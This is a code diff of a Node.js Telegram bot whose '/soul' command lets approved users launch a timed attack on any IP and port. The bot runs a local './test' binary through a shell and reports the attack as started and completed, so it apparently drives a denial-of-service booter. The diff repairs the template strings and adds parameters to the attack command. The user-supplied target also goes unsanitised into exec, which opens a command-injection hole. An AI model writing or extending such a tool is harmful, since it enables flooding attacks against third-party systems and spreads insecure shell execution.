@@ -42,29 +42,31 @@ bot.onText(/\/cpu/, (msg) => {
     bot.sendMessage(msg.chat.id, `📊 **Current CPU Usage:**\n\n🔧 CPU Usage: **${cpuUsage}%**`);
 });
 
+
 bot.onText(/\/soul (\S+) (\d+) (\d+)/, async (msg, match) => {
     const chatId = msg.chat.id;
     const ip = match[1];
     const port = parseInt(match[2]);
     const duration = parseInt(match[3]);
 
+    // Check if user is approved
     const user = await User.findOne({ userId: chatId.toString() });
 
     if (!user) {
         return bot.sendMessage(chatId, "❌ You are not authorized to use this command.");
     }
 
-    bot.sendMessage(chatId, 🚀 Attack started on ${ip}:${port} for ${duration} seconds!);
+    bot.sendMessage(chatId, `🚀 Attack started on ${ip}:${port} for ${duration} seconds!`);
 
-
-    exec(nohup ./test ${ip} ${port} ${duration} > attack.log 2>&1 &, (error, stdout, stderr) => {
+    // Execute the attack command
+    exec(`nohup ./test ${ip} ${port} ${duration} 9 100 > attack.log 2>&1 &`, (error, stdout, stderr) => {
         if (error) {
-            return bot.sendMessage(chatId, ❌ Error: ${error.message});
+            return bot.sendMessage(chatId, `❌ Error: ${error.message}`);
         }
         if (stderr) {
-            return bot.sendMessage(chatId, ❌ Error: ${stderr});
+            return bot.sendMessage(chatId, `❌ Error: ${stderr}`);
         }
-
+        // Success message, you could log the attack here if needed
         bot.sendMessage(chatId, "✅ Attack executed successfully.");
     });
 });
